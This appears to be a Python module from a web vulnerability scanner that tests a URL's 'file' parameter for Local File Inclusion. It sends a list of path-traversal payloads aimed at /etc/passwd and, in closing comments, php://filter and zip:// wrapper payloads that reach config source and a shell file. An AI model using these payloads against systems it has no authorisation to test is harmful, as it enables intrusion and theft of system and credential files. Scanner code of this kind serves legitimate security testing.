import requests
import re
from . import get_session

# Local File Inclusion payloads
PAYLOADS = [
    "../../../etc/passwd", 
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd", 
    "....//....//....//etc/passwd",
    "../../../../../../../../etc/passwd", 
    "../../../../../../../../../../etc/passwd%00"
]

def check(url, session=None):
    # Use the session helper
    req_session = get_session(session)
    
    findings = []
    for payload in PAYLOADS:
        target_url = f"{url}?file={payload}"
        try:
            response = req_session.get(target_url, timeout=5)
            # Look for /etc/passwd content
            if "root:x:0:0" in response.text or re.search(r'([a-z]+):\w+:\d+:\d+:.*', response.text):
                findings.append({"url": target_url, "payload": payload})
        except Exception:
            continue
    return findings

# === Advanced LFI Payloads ===
#    "php://filter/convert.base64-encode/resource=config.php",
#    "zip://uploads/archive.zip#shell.php",
#    "../../../../etc/passwd%00.png",
